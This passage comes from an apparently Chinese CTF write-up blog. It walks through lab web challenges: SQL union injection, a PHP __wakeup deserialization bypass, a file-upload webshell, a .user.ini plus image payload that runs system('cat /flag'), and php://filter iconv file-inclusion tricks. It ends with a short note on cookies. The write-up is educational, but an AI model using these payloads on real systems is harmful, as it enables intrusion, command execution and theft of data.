<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&quot;secret_table&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703205526044.png"><img src="/wp-Gongfang/image-20220703205526044.png" alt="image-20220703205526044"></a></p>
<p>看到fl4g，尝试查看其数据</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> fl4g  <span class="keyword">from</span> secret_table),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220703205758800.png"><img src="/wp-Gongfang/image-20220703205758800.png" alt="image-20220703205758800"></a></p>
<p>得到flag</p>
<p>这里用sqlmap也可以，但还是试试手工注入更好</p>
<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-题目描述-21"><a href="#1-题目描述-21" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-6"><a href="#2）wp-6" class="headerlink" title="2）wp"></a>2）wp</h3><p>这个开始有点懵，借鉴了大佬的wp，才理解了一些，需要wp可以认真看看这篇文章，以下只加上个人理解和个人认为文章重点</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">原文链接</a></p>
<p>js源代码分析：</p>
<p>_等于一个$函数内容</p>
<figure class="highlight openscad"><table><tr><td class="code"><pre><span class="line">_=&#x27;<span class="function"><span class="keyword">function</span> $<span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>一个输入框</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;c&quot;</span>&gt;&lt; <span class="attribute">onclick</span>=$()&gt;Ok&lt;/&gt;\&#x27;);</span><br></pre></td></tr></table></figure>

<pre><code>***核心代码：***
eval函数，这是执行函数；这里执行了_变量中的内容也就是&#39;&#39;中的内容，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来
这里可以使用浏览器打开，也可以将修改后的源代码放入控制台执行（放入控制台需要注意删除script前后标签）
</code></pre>
<p>浏览器打开： <a data-fancybox="gallery" data-src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">   if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)</span><br><span class="line">         if(e.match(/e98aa$/)!=null)</span><br><span class="line">             if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">             var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">             var s=[t,n,r,i];</span><br><span class="line">             for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</span><br><span class="line">             &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">οnclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>

<p>我们的终极目标是打印出</p>
<p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p>
<p>因此我们要满足关键变量e的条件</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">e.<span class="built_in">length</span>==<span class="number">16</span></span><br><span class="line">e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>这里又用到了正则表达式<br><u>^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa</u>，其它的只要匹配到就好，没有位置要求<br>于是我们构造e的值</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span>be0f233ac7be98aa</span><br></pre></td></tr></table></figure>

<p>将上面的核心代码后缀改为html格式，打开如下图所示<br>在这里插入图片描述<br>框中输入e的值<code>be0f233ac7be98aa</code>，点击Ok（当然你也可以在原来获得的web100文件浏览器执行的输入框中输入be0f233ac7be98aa）</p>
<p><a data-fancybox="gallery" data-src="https://img-blog.csdnimg.cn/20190624211524604.png"><img src="https://img-blog.csdnimg.cn/20190624211524604.png" alt="在这里插入图片描述"></a></p>
<p><strong>注1：当然，如果大家觉得构造麻烦，可以直接执行获取flag的核心代码，代码如下</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> s=[t,n,r,i];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">document.write(<span class="regexp">s[o%4][0]</span>);s[o%4].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="regexp">//</span>输出fl;随后删除fl</span><br><span class="line">/*</span><br><span class="line">代码运行详解：</span><br><span class="line">第一步：document.write(<span class="regexp">s[0][0]</span>);s[<span class="number">0</span>].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">第二步：document.write(t[<span class="number">0</span>]);t.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">第三步：document.write(<span class="string">&quot;fl&quot;</span>);删除t[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>]中第一个位置，一个项目，即删除fl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">document.write的功能可以看一下这篇文章https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_34986769/</span>article<span class="regexp">/details/</span><span class="number">52160532</span></span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> 方法向/从数组中添加/删除项目，然后返回被删除的项目。</span><br><span class="line">注释：该方法会改变原始数组。</span><br><span class="line">语法</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">参数	                         描述</span><br><span class="line">index	                     必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。</span><br><span class="line">howmany	                     必需。要删除的项目数量。如果设置为 <span class="number">0</span>，则不会删除项目。</span><br><span class="line">item1, ..., itemX	         可选。向数组添加的新项目。</span><br></pre></td></tr></table></figure>

<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-题目描述-22"><a href="#1-题目描述-22" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-7"><a href="#2）wp-7" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题需要了解<a href="../../../../2022/05/28/Web-study">php反序列化</a>中__wakeup漏洞的利用,还有<a href="../../../../2022/05/28/Web-study">php魔术方法</a></p>
<p><code>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p>开始的代码不完整，是一段残缺的PHP代码，根据题目名字知道这是给反序列化的题目，?code&#x3D;可能是提醒需要在url利用以GET方式提交code值</p>
<p><a data-fancybox="gallery" data-src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png"><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="在这里插入图片描述"></a></p>
<p>下方是把代码补充完善后，并并调用序列化函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                        <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;       <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;                                </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"><span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();    </span><br><span class="line"><span class="comment">//使用new运算符来实例化该类（xctf）的对象为</span></span><br><span class="line"><span class="comment">//这里也就是定义了了一个新的类用来反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       </span><br><span class="line"><span class="comment">//serialize()序列化函数</span></span><br><span class="line"><span class="comment">//输出被序列化的对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行该php代码，得到序列化后的字符串</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220627215806623.png"><img src="/wp-Gongfang/image-20220627215806623.png" alt="image-20220627215806623"></a></p>
<p>如果看不懂，可以看看方便下图理解</p>
<p><a data-fancybox="gallery" data-src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></a></p>
<p>这里如果直接访问，会失败</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220627220136916.png"><img src="/wp-Gongfang/image-20220627220136916.png" alt="image-20220627220136916"></a></p>
<p>因为我们忽略了<code>__wakeup()</code>，这里就需要了解php的魔术方法当中的绕过__wakeup()</p>
<p><code>如何绕过__wakeup()：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。从而绕过了__wakeup()函数</code></p>
<p>在这串序列化的代码中，对象属性数为1，把下列的1改为2(&gt;1)，即可</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>–&gt;</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<hr>
<p>这里我插入一个新学到的payload</p>
<p><code>C:4:&quot;xctf&quot;:0:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>发现也是可以的，也是可以绕过<code>__wakeup()</code>函数</p>
<p>C代表这个类实现了serializeable接口，serializeable不支持wakeup，就绕过去了</p>
<hr>
<p>然后payload:</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p>得到flag</p>
<p>补充：</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">php实例化：是指在面向对象的编程中，把用类创建对象的过程称为实例化，是将一个抽象的概念类，具体到该类实物的过程，实例化过程中一般由【类名 对象名 = <span class="keyword">new</span> 类名（参数<span class="number">1</span>，参数<span class="number">2.</span>..参数n）】构成。</span><br><span class="line"></span><br><span class="line">php类对象是什么意思？</span><br><span class="line">类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</span><br><span class="line">对象 − 是类的实例。</span><br><span class="line">在面向对象的程序设计（英语：<span class="built_in">Object</span>-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。</span><br></pre></td></tr></table></figure>

<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-题目描述-23"><a href="#1-题目描述-23" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>典型的文件上传漏洞，可以先把upload-labs线下靶场学习一下</p>
<p>先直接上传php文件，发现被拦截</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220704104557362.png"><img src="/wp-Gongfang/image-20220704104557362.png" alt="image-20220704104557362"></a></p>
<p>于是构造一个图片木马上传，然后burp修改后缀，看看是不是前端验证</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220704104752019.png"><img src="/wp-Gongfang/image-20220704104752019.png" alt="image-20220704104752019"></a></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220704104814064.png"><img src="/wp-Gongfang/image-20220704104814064.png" alt="image-20220704104814064"></a></p>
<p>发现上传成功</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220704104830480.png"><img src="/wp-Gongfang/image-20220704104830480.png" alt="image-20220704104830480"></a></p>
<p>用蚁剑试着连一下</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220704105115729.png"><img src="/wp-Gongfang/image-20220704105115729.png" alt="image-20220704105115729"></a></p>
<p>发现连接成功，打开看看，在html下发现flag.php</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220704105139801.png"><img src="/wp-Gongfang/image-20220704105139801.png" alt="image-20220704105139801"></a></p>
<p>打开文件</p>
<p>得到flag</p>
<hr>
<p>后面的题难度飞升，水平有限，后面的题仅写一些个人笔记，建议认真阅读其他大佬的wp，遇到难点，建议先巩固概念基础</p>
<h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>一道tornado框架题，属于ssti注入，建议先看一些文章</p>
<p>了解了再尝试完成</p>
<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="1-easyupload"><a href="#1-easyupload" class="headerlink" title="1.easyupload"></a>1.easyupload</h2><h3 id="1-题目描述-24"><a href="#1-题目描述-24" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p>
<h3 id="2-wp-17"><a href="#2-wp-17" class="headerlink" title="2)wp"></a>2)wp</h3><p><u><em>这道题写的1星，但是过滤又多，还涉及了上传.user.ini文件，学到了,下面是大佬的wp</em></u></p>
<p>本题需要利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的</p>
<p>本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行</p>
<p>这里需要绕过的点如下</p>
<ul>
<li>检查文件内容是否有php字符串</li>
<li>检查后缀中是否有htaccess或ph</li>
<li>检查文件头部信息</li>
<li>文件MIME类型</li>
</ul>
<p>对于第一点可以利用短标签绕过，例如 <?=phpinfo();?></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">把short_open_tag 字段改为On，就可以实现短标签功能</span><br><span class="line"></span><br><span class="line">短标签：</span><br><span class="line"><span class="number">1</span>.能正常解析类似于这样形式的php文件： <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出，在短标签看来，<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正确：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">从这个对比试验我们可以看出：</span><br><span class="line">在短标签模式下，</span><br><span class="line">我们执行php语句php函数，都用类似于这样形式的php文件：</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">但是我们要输出一个flag，或者变量时，使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出</span><br></pre></td></tr></table></figure>

<p>对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章</p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</p>
<p> 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</p>
<p> 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p>
<p>第三点绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></p>
<p>第四点绕过方法即修改上传时的Content-Type</p>
<p>因此最终的payload为：<br> 上传.user.ini，内容为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>上传a.jpg，内容为</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-file-include【江苏工匠杯】"><a href="#2-file-include【江苏工匠杯】" class="headerlink" title="2.file_include【江苏工匠杯】"></a>2.file_include【江苏工匠杯】</h2><h3 id="1-题目描述-25"><a href="#1-题目描述-25" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>怎么读取文件呢？</p>
<h3 id="2-wp-18"><a href="#2-wp-18" class="headerlink" title="2)wp"></a>2)wp</h3><p>这是一道文件包含的题目</p>
<p>但是开始一直用伪协议读取都失败</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">61462</span>/?filename=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20230104221540491.png"><img src="/wp-Gongfang/image-20230104221540491.png" alt="image-20230104221540491"></a></p>
<p>根据源码猜测，是在<code>check.php</code>中设置了过滤，但是直接访问是无法得到文件内容的</p>
<p>这里涉及到一个知识点</p>
<h4 id="Conversion-Filters（转换过滤器）"><a href="#Conversion-Filters（转换过滤器）" class="headerlink" title="Conversion Filters（转换过滤器）"></a>Conversion Filters（转换过滤器）</h4><p><code>Conversion Filters</code>（转换过滤器）如同 <code>string.</code> 过滤器，<code>convert.</code> 过滤器的作用就和其名字一样。转换过滤器是 <code>PHP 5.0.0</code> 添加的。</p>
<p>常用的<code>convert.base64</code>就是其应用</p>
<p>但是我们这里测试可以知道</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20230104222154684.png"><img src="/wp-Gongfang/image-20230104222154684.png" alt="image-20230104222154684"></a></p>
<p>这里将<code>base64</code>过滤了，也就是不能进行<code>base64</code>转化，<code>read</code>也不能用</p>
<p>于是这里就提及了</p>
<h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h5><p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
<p>使用方法</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;.&lt;output-<span class="keyword">encoding</span>&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;/&lt;output-<span class="keyword">encoding</span>&gt;</span><br></pre></td></tr></table></figure>

<p>相比单纯的<code>convert.</code>加上<code>.iconv</code>后，可以将数据进行转化后，再进行转化输出</p>
<p>而其能进行加码的方式有</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br></pre></td></tr></table></figure>



<p>但是这些加码方式也有些被过滤</p>
<p>进行爆破得到<code>UTF-7，UCS-4*</code>可以</p>
<p>直接构造</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">61.147.171.105:61462</span>/?filename=php://filter/convert.iconv.UTF-<span class="number">7</span>.UCS-<span class="number">4</span>*/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20230104223717245.png"><img src="/wp-Gongfang/image-20230104223717245.png" alt="image-20230104223717245"></a></p>
<hr>
<p>查看一下<code>check.php</code>内容</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20230104223436793.png"><img src="/wp-Gongfang/image-20230104223436793.png" alt="image-20230104223436793"></a></p>
<p>发现过滤了</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">base|<span class="type">be</span>|<span class="type">encode</span>|<span class="type">print</span>|<span class="type">zlib</span>|<span class="type">quoted</span>|<span class="type">write</span>|<span class="type">rot13</span>|<span class="type">read</span>|<span class="type">string</span></span><br><span class="line"></span><br><span class="line">看到这里过滤了quoted，string，所以这里的转化过滤器函数用的iconv()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础随记</title>
    <url>/Noteless/</url>
    <content><![CDATA[<p><code>随便记一下，大都常混淆或者易忘基础知识</code></p>
<span id="more"></span>

<h1 id="网站连接重置，用清空缓存和Cookie解决"><a href="#网站连接重置，用清空缓存和Cookie解决" class="headerlink" title="网站连接重置，用清空缓存和Cookie解决"></a>网站连接重置，用清空缓存和<u><strong>Cookie</strong></u>解决</h1><p>今天在打buuctf靶场的时候遇到一个问题，就是当页面跳转时，会显示连接重置，导致我的sql注入结果不能显示，然后百度了一下，发现可能是浏览器缓存太多导致的，于是我把浏览器的缓存和cookie一同全部清空，然后我再刷新sql 注入那道题的界面，解决了，没有再显示连接重置，也显示了我的注入结果，我正要交flag的时候，然后，我发现…..，我的buuctf账号下线，我的csdn账号也下线了</p>
<p>cookie的作用和重要性就出来了，从这个事情看出，cookie是当我们登录网站的主要身份凭证，当我删除cookie后，我无法证明自己身份时，即网站当前浏览器无该账号当前在该网站的cookie时，网站就会强制下线我的账号</p>
<p>但是，如果我们在登录网站时（没有退出），点击了其他链接导致自己在该浏览器的该网站的cookie外泄，被有心人获取，那么拥有你的cookie的人，就可以登录你的账号，在你登录的网站上进行修改密码，删除文章，甚至可以转账等等</p>
<p>所以以后登录了一些重要网站时，比如支付宝，淘宝，博客网站时，别随便点击链接，保证自己的信息安全，不要黑客被黑客黑了，那确实有点难为情了</p>
<blockquote>
<p><code>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容</code></p>
</blockquote>
